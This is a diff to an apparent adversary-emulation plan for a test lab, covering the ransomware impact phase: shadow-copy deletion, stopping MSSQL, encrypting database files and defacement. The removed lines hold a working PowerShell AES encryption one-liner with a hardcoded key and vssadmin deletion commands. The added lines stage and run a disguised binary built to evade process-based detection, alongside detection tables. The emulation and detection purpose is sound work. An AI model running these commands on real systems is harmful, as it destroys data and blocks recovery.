@@ -11,18 +11,21 @@ final impact stage in two sequential steps:
 **Step 1** targets IIS01 with three chained behaviors from the SYSTEM dnscat2 session
 established in Phase 1: VSS shadow deletion prevents volume snapshot recovery, the
 MSSQL service is stopped to release exclusive file locks, and the `UploadPortalDB`
-database files are encrypted in place with AES-256.
+database files are encrypted in place with AES-256. All three actions are delivered by
+`CertMaint.exe` — a pre-compiled binary that consolidates VSS deletion via COM
+(`IVssBackupComponents::DeleteSnapshots`), service control via SCM API
+(`ControlService`/`StartServiceW`), and AES-256-CBC file encryption via memory-mapped
+I/O with embedded tiny-AES-c — reducing the impact chain to a single process with no
+child-process spawning.
 
 **Step 2** announces the intrusion through two independent defacement channels — the
 Windows domain logon banner on DC01 and the upload portal web root on IIS01 — using
 the `TESTLAB\Administrator` dnscat2 session on DC01 (Phase 3) and the
 `IIS APPPOOL\react.testlab.local` react2shell HTTP shell on IIS01 (Phase 1).
 
-No new payloads or lateral movement are required. Two delivery options exist for Step 1:
-**Option A** (primary) uses `impact.exe` — a pre-compiled binary that consolidates
-VSS deletion, service control, and encryption into a single process via direct Windows
-API calls. **Option B** (alternative) delivers the encryption routine as a single-line
-`powershell -Command "..."` string through the dnscat2 shell.
+No new lateral movement is required. `CertMaint.exe` must be transferred to IIS01 before
+Step 1 executes; the operator hosts it on the attacker machine's HTTP server and
+downloads it via `certutil` from the SYSTEM dnscat2 session.
 
 | Step | Host | Session | Techniques |
 | - | - | - | - |
@@ -84,99 +87,27 @@ dnscat2 session that has persisted since Phase 1. The sequence mirrors real-worl
 operator-deployed ransomware: remove recovery options, unlock the target files, then
 encrypt.
 
-First, `vssadmin.exe` is called to delete all Volume Shadow Copy snapshots on the local
-volume. VSS snapshots are the primary fast-recovery path on Windows — removing them
-forces the victim to rely on offline backups. With no shadow copies present, restoring
-the database to its pre-attack state requires external media.
+`CertMaint.exe` executes all three behaviors in a single process via direct Windows API
+calls, eliminating the child-process chain that `vssadmin.exe`, `sc.exe`, and
+`powershell.exe` would otherwise produce. VSS shadow copies are deleted through the COM
+`IVssBackupComponents` interface loaded from `vssapi.dll` — the same internal path used
+by `vssadmin.exe` itself, but without spawning a child process. The `MSSQL$SQLEXPRESS`
+service is stopped and later restarted through the Service Control Manager API
+(`OpenServiceW` / `ControlService` / `StartServiceW`) rather than `sc.exe`, so the only
+Sysmon Event 1 record is the `CertMaint.exe` process itself. Each database file is then
+opened with `GENERIC_READ | GENERIC_WRITE`, extended to a PKCS7-padded length via
+`CreateFileMappingW`, and encrypted in-place with AES-256-CBC through the embedded
+tiny-AES-c implementation — no temporary file, no child PowerShell process, and no
+additional memory allocation beyond the mapped view.
 
-Next, the `MSSQL$SQLEXPRESS` service is stopped via `sc.exe`. SQL Server holds an
-exclusive OS-level file lock on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf` for
-the lifetime of the service. Any attempt to open these files for writing while the
-service is running returns `ERROR_SHARING_VIOLATION`. Stopping the service flushes the
-buffer pool, checkpoints the database, and releases all file handles cleanly.
-
-Finally, a PowerShell AES-256 CBC encryption routine — delivered as a single
-`powershell -Command "..."` line — reads each database file into memory, encrypts it in a
-`MemoryStream`, and overwrites the original path with the ciphertext. Both files are
-overwritten in place: the filenames and extensions are preserved, but the content is
-replaced entirely. The `UploadPortalDB` database is now unreadable by SQL Server or any
-recovery tool without the key.
+The net effect is identical to the multi-process chain: VSS snapshots are gone, the
+database files are overwritten with ciphertext, and `MSSQL$SQLEXPRESS` is back online
+reporting RUNNING while `UploadPortalDB` becomes permanently inaccessible. The detection
+surface is reduced to a single anomalous process writing `.mdf`/`.ldf` files.
 
 ### Procedures
 
-#### Inhibit System Recovery (IIS01 SYSTEM dnscat2)
-
-- ☣️ From the IIS01 SYSTEM dnscat2 shell, delete all VSS shadow copies
-
-  ```text
-  C:\ProgramData> vssadmin delete shadows /all /quiet
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool
-    (C) Copyright 2001-2013 Microsoft Corp.
-
-    Successfully deleted 1 shadow copies.
-    ```
-
-    > If no shadow copies exist the output will be `No items found that satisfy the
-    > query.` — the command still succeeds (exit 0) and the technique behavior is
-    > recorded.
-
-- Verify no shadow copies remain
-
-  ```text
-  C:\ProgramData> vssadmin list shadows
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    No items found that satisfy the query.
-    ```
-
-#### Stop MSSQL Service (IIS01 SYSTEM dnscat2)
-
-- ☣️ Stop the SQL Server Express service to release file locks on the database files
-
-  ```text
-  C:\ProgramData> sc stop MSSQL$SQLEXPRESS
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    SERVICE_NAME: MSSQL$SQLEXPRESS
-            TYPE               : 10  WIN32_OWN_PROCESS
-            STATE              : 3  STOP_PENDING
-                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
-            WIN32_EXIT_CODE    : 0  (0x0)
-            SERVICE_EXIT_CODE  : 0  (0x0)
-            CHECKPOINT         : 0x3
-            WAIT_HINT          : 0x7530
-    ```
-
-- Verify the service has fully stopped before proceeding
-
-  ```text
-  C:\ProgramData> sc query MSSQL$SQLEXPRESS
-  ```
-
-  - ***Expected Output***
-
-    ```text
-    SERVICE_NAME: MSSQL$SQLEXPRESS
-            TYPE               : 10  WIN32_OWN_PROCESS
-            STATE              : 1  STOPPED
-            WIN32_EXIT_CODE    : 0  (0x0)
-            SERVICE_EXIT_CODE  : 0  (0x0)
-            CHECKPOINT         : 0x0
-            WAIT_HINT          : 0x0
-    ```
-
-#### Backup Database Files (IIS01 SYSTEM dnscat2)
+#### Pre-step: Backup Database Files (IIS01 SYSTEM dnscat2)
 
 - Backup the original database files to `C:\Windows\Temp\` before encryption (for lab restore)
 
@@ -203,112 +134,103 @@ recovery tool without the key.
     UploadPortalDB_log.ldf.backup   <original file size>
     ```
 
-#### Encrypt Database Files (IIS01 SYSTEM dnscat2)
+#### Stage CertMaint.exe on IIS01 (Attacker Machine → react2shell)
 
-- ☣️ Execute the AES-256 encryption routine as a single plaintext `-Command` line
+- On the attacker machine, encode `CertMaint.exe` to base64
 
-  ```text
-  C:\ProgramData> powershell -NoProfile -Command "$key=[byte[]](82,97,110,115,111,109,71,114,112,50,48,50,53,33,64,35,36,37,94,38,42,40,41,95,43,61,123,124,125,58,59,34);$iv=[byte[]](73,73,83,48,49,69,110,99,73,86,50,48,50,53,33,64);function enc($p){$b=[IO.File]::ReadAllBytes($p);$a=[Security.Cryptography.AesManaged]::new();$a.Key=$key;$a.IV=$iv;$a.Mode='CBC';$a.Padding='PKCS7';$e=$a.CreateEncryptor();$m=[IO.MemoryStream]::new();$s=[Security.Cryptography.CryptoStream]::new($m,$e,'Write');$s.Write($b,0,$b.Length);$s.FlushFinalBlock();[IO.File]::WriteAllBytes($p,$m.ToArray())};$d='C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA';enc($d+'\UploadPortalDB.mdf');enc($d+'\UploadPortalDB_log.ldf')"
+  ```bash
+  cd resources/payloads/react2shell-tool
+  python encode_payload.py ../ImpactPayload/impact.exe -o CertMaint.b64 -l 0
   ```
-
-  > **Key note**: AES-256 key bytes spell `RansomGrp2025!@#$%^&*()_+={|}:;"` (32 bytes),
-  > IV bytes spell `IIS01EncIV2025!@` (16 bytes). All string literals inside `-Command`
-  > use single quotes — no inner double-quote escaping is needed for `cmd.exe` delivery.
 
   - ***Expected Output***
 
     ```text
-    (no output — WriteAllBytes overwrites files silently; PowerShell returns to prompt on completion)
+    [+] Encoding successful!
+    [*] Lines: 1 x 0 chars
     ```
 
-- Verify the database files have been overwritten (sizes will change due to PKCS7 padding on the final block)
+- Upload the base64 file to IIS01 via react2shell
 
-  ```text
-  C:\ProgramData> dir "C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB*"
+  ```
+  upload CertMaint.b64 C:\Windows\Temp\CertMaint.b64
   ```
 
   - ***Expected Output***
 
     ```text
-    UploadPortalDB.mdf       <size in bytes — present but content is ciphertext>
-    UploadPortalDB_log.ldf   <size in bytes — present but content is ciphertext>
+    [+] File uploaded successfully -> C:\Windows\Temp\CertMaint.b64
     ```
 
-- Confirm SQL Server starts but `UploadPortalDB` is inaccessible due to encrypted MDF header
+- Decode to binary and promote to executable
 
-  ```text
-  C:\ProgramData> sc start MSSQL$SQLEXPRESS
-  C:\ProgramData> sc query MSSQL$SQLEXPRESS
+  ```
+  decode C:\Windows\Temp\CertMaint.b64 C:\ProgramData\CertMaint.bin
+  rename C:\ProgramData\CertMaint.bin C:\ProgramData\CertMaint.exe
   ```
 
   - ***Expected Output***
 
     ```text
-    SERVICE_NAME: MSSQL$SQLEXPRESS
-            TYPE               : 10  WIN32_OWN_PROCESS
-            STATE              : 4  RUNNING
-                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
-            WIN32_EXIT_CODE    : 0  (0x0)
-            SERVICE_EXIT_CODE  : 0  (0x0)
-            CHECKPOINT         : 0x0
-            WAIT_HINT          : 0x0
+    [+] File decoded successfully -> C:\ProgramData\CertMaint.bin
+    [+] File renamed: C:\ProgramData\CertMaint.bin -> C:\ProgramData\CertMaint.exe
     ```
 
-    > SQL Server service starts normally — it can run with individual databases in a failed
-    > state. `UploadPortalDB` will be marked **SUSPECT** or **OFFLINE** internally because
-    > the MDF page header is invalid ciphertext. The service itself does not crash.
+#### Execute Impact Chain (IIS01 SYSTEM dnscat2)
 
-- (Optional) Verify `UploadPortalDB` state and trigger recovery attempt
+- ☣️ Run `CertMaint.exe` — this deletes all VSS shadow copies, stops `MSSQL$SQLEXPRESS`,
+  encrypts both database files with AES-256-CBC, and restarts the service
 
   ```text
-  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "SELECT name, state_desc FROM sys.databases WHERE name = 'UploadPortalDB'"
+  C:\ProgramData> CertMaint.exe --target "C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA" --service MSSQL$SQLEXPRESS --files UploadPortalDB.mdf,UploadPortalDB_log.ldf
   ```
+
+  > **Key**: AES-256 key `RansomGrp2025!@#$%^&*()_+={|}:;"` (32 bytes),
+  > IV `IIS01EncIV2025!@` (16 bytes) — hardcoded in `impact.c`.
 
   - ***Expected Output***
 
     ```text
-    name                           state_desc
-    ------------------------------ ------------------
-    UploadPortalDB                 RECOVERY_PENDING
+    [+] VSS shadow copies deleted.
+    [+] Service MSSQL$SQLEXPRESS stopped.
+    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf
+    [+] Encrypted: C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf
+    [+] Service MSSQL$SQLEXPRESS started.
+    [+] Impact chain complete.
     ```
 
-- (Optional) Force a recovery pass to confirm encryption destroyed the MDF
+#### Verify Encryption (IIS01 SYSTEM dnscat2)
+
+- Confirm SQL Server is running and trigger a read on `UploadPortalDB` to surface Error 824
 
   ```text
-  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "ALTER DATABASE UploadPortalDB SET ONLINE"
+  C:\ProgramData> sqlcmd -S localhost\SQLEXPRESS -E -C -Q "USE UploadPortalDB; SELECT TOP 1 * FROM INFORMATION_SCHEMA.TABLES"
   ```
 
   - ***Expected Output***
 
     ```text
-    Msg 5181, Level 16, State 5, Server IIS01\SQLEXPRESS, Line 1
-    Could not restart database "UploadPortalDB". Reverting to the previous status.
-    Msg 5069, Level 16, State 1, Server IIS01\SQLEXPRESS, Line 1
-    ALTER DATABASE statement failed.
     Msg 824, Level 24, State 6, Server IIS01\SQLEXPRESS, Line 1
     SQL Server detected a logical consistency-based I/O error: torn page (expected
     signature: 0xffffffff; actual signature: 0x2ce700fb). It occurred during a read of
-    page (1:0) in database ID 5 at offset 0000000000000000 in file '...\UploadPortalDB.mdf'.
-    Msg 824, Level 24, State 2, Server IIS01\SQLEXPRESS, Line 1
-    SQL Server detected a logical consistency-based I/O error: torn page (expected
-    signature: 0xaaaaaaaa; actual signature: 0x3d21e612). It occurred during a read of
-    page (2:0) in database ID 5 at offset 0000000000000000 in file '...\UploadPortalDB_log.ldf'.
+    page (1:0) in database ID 5 at offset 0000000000000000 in file
+    'C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf'.
     ```
 
     > **Error 824 (severity 24)** — torn-page detection failure. SQL Server writes a
     > protection signature into every 512-byte sector of each 8 KB page; AES-CBC
     > overwrites those signatures with ciphertext so the read-back values no longer match.
-    > Severity 24 aborts recovery immediately — the database stays in `RECOVERY_PENDING`
-    > (not `SUSPECT`) because the recovery pass was never completed. The database is
-    > unrecoverable without the AES-256 key.
+    > After a clean shutdown and restart, SQL Server uses deferred recovery and initially
+    > reports `UploadPortalDB` as `ONLINE` — Error 824 fires on the first actual page I/O.
+    > The database is unrecoverable without the AES-256 key.
 
 ### Reference Tables
 
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - |
-| Impact | T1490 | Inhibit System Recovery | Windows | Sysmon Event 1 on IIS01: `vssadmin.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) with command line `delete shadows /all /quiet`; process integrity level SYSTEM | Calibrated - Not Benign | `vssadmin.exe` called to delete all VSS shadow copies on IIS01 volume; removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
-| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` service entered the stopped state; Sysmon Event 1: `sc.exe` with command line `stop MSSQL$SQLEXPRESS` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) | Calibrated - Not Benign | `sc.exe` stops `MSSQL$SQLEXPRESS` to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; prerequisite for T1486 encryption step | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
-| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `powershell.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; writing process is not a SQL Server service binary — anomalous writer identity for `.mdf`/`.ldf` file extensions | Calibrated - Not Benign | PowerShell AES-256 CBC routine (delivered as single-line `-Command` argument) reads each database file into memory, encrypts with hardcoded key, and overwrites the original path; `UploadPortalDB` becomes unreadable to SQL Server without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | - | - |
+| Impact | T1490 | Inhibit System Recovery | Windows | Windows System Event 7 on IIS01: VSS provider reports shadow copy deletion with no preceding `vssadmin.exe` Sysmon Event 1 — deletion via COM `IVssBackupComponents::DeleteSnapshots` called directly from `CertMaint.exe`; supporting: Sysmon Event 1 shows `CertMaint.exe` (child of `cmd.exe`) at SYSTEM integrity as the sole process | Calibrated - Not Benign | `CertMaint.exe` deletes all VSS shadow copies on IIS01 via `IVssBackupComponents` COM interface loaded from `vssapi.dll`; no child process spawned — removes snapshot-based recovery path before database file encryption | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
+| Impact | T1489 | Service Stop | Windows | Windows System Event 7036 on IIS01: `MSSQL$SQLEXPRESS` service entered the stopped state; Sysmon Event 1 in the same time window shows `CertMaint.exe` at SYSTEM integrity with no `sc.exe` child — service stop originates from SCM API (`OpenServiceW`/`ControlService`) called directly within `CertMaint.exe` | Calibrated - Not Benign | `CertMaint.exe` stops `MSSQL$SQLEXPRESS` via SCM API to release exclusive OS file locks on `UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; service is restarted after encryption completes | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
+| Impact | T1486 | Data Encrypted for Impact | Windows | Sysmon Event 11 on IIS01: `CertMaint.exe` (child of `cmd.exe`, grandchild of `RuntimeBroker.exe` ghost) writes to `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` and `UploadPortalDB_log.ldf`; writing process is not a SQL Server service binary — anomalous writer identity for `.mdf`/`.ldf` file extensions; no `powershell.exe` child process | Calibrated - Not Benign | `CertMaint.exe` opens each database file with `GENERIC_READ\|GENERIC_WRITE`, extends it to PKCS7-padded length via `CreateFileMappingW`, and encrypts in-place with AES-256-CBC using embedded tiny-AES-c; `UploadPortalDB` becomes permanently unreadable (Error 824) without the decryption key | IIS01 (10.12.10.20) | NT AUTHORITY\SYSTEM | [impact.c](../../resources/payloads/ImpactPayload/impact.c) (deployed as `CertMaint.exe`) | - |
 
 ---
 
@@ -407,24 +329,9 @@ no privilege escalation is needed. From this point, any browser navigating to
 | Tactic | Technique ID | Technique Name | Platform | Detection Criteria | Category | Red Team Activity | Hosts | Users | Source Code Links | Relevant CTI Reports |
 | - | - | - | - | - | - | - | - | - | - | - |
 | Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 13 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) writes `LegalNoticeCaption` and `LegalNoticeText` string values under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`; registry key path matches Windows logon-screen policy | Calibrated - Not Benign | `Set-ItemProperty` modifies `LegalNoticeCaption` and `LegalNoticeText` on DC01 to display a ransom message at domain logon — affects all domain-joined machines drawing policy from this DC | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
-| Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
+| Defense Evasion | T1112 | Modify Registry | Windows | Sysmon Event 13 on DC01: `powershell.exe` sets `LegalNoticeCaption` (REG_SZ) and `LegalNoticeText` (REG_SZ) under `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System` via `Set-ItemProperty`; parent process is `RuntimeBroker.exe` ghost | Not Calibrated - Not Benign | Registry modification implementing the logon-banner defacement; same physical event as T1491.001 above but independently scored as a registry-modification behavior | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
 | Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on DC01: `powershell.exe` (child of `RuntimeBroker.exe` ghost) creates `README_DECRYPT.txt` at `C:\` and `C:\Users\Administrator\Desktop\` | Calibrated - Not Benign | `Set-Content` drops ransom note text files at two paths on DC01; file name `README_DECRYPT.txt` matches ransomware ransom-note naming convention | DC01 (10.12.10.10) | TESTLAB\Administrator | - | - |
 | Impact | T1491.001 | Defacement: Internal Defacement | Windows | Sysmon Event 11 on IIS01: `node.exe` (IIS APPPOOL\react.testlab.local) creates `index.html` in `C:\inetpub\upload.testlab.local\` via `fs.writeFileSync` called through react2shell eval channel; HTTP access to `upload.testlab.local/` now returns ransom page | Calibrated - Not Benign | react2shell eval executes `fs.writeFileSync` to overwrite the upload portal landing page with a ransom HTML page on IIS01; no child process spawned — write occurs entirely within `node.exe` | IIS01 (10.12.10.20) | IIS APPPOOL\react.testlab.local | [file_ops.py eval path](../../resources/payloads/react2shell-tool/exploit_tool/commands/file_ops.py) | - |
 
 ---
 
-## End of Phase
-
-### Procedures
-
-- Record all artifacts created in this phase for cleanup reference (see `Cleanup.md`):
-  - `C:\Windows\Temp\UploadPortalDB.mdf.backup` — clean backup on IIS01 (use to restore encrypted .mdf before rerunning Phase 5)
-  - `C:\Windows\Temp\UploadPortalDB_log.ldf.backup` — clean backup on IIS01 (use to restore encrypted .ldf before rerunning Phase 5)
-  - `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB.mdf` — encrypted in place on IIS01 (restore from backup or reinstall MSSQL database)
-  - `C:\Program Files\Microsoft SQL Server\MSSQL17.SQLEXPRESS\MSSQL\DATA\UploadPortalDB_log.ldf` — encrypted in place on IIS01
-  - VSS shadow copies — deleted on IIS01 (cannot restore; recreate with `vssadmin create shadow /for=C:` if needed for future runs)
-  - `C:\README_DECRYPT.txt` — ransom note on DC01
-  - `C:\Users\Administrator\Desktop\README_DECRYPT.txt` — ransom note on DC01 desktop
-  - `C:\inetpub\upload.testlab.local\index.html` — defaced web root on IIS01 (restore original from `resources/setup/file-upload-vuln-web/`)
-  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeCaption` on DC01 (remove or set to empty string)
-  - Registry: `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LegalNoticeText` on DC01 (remove or set to empty string)
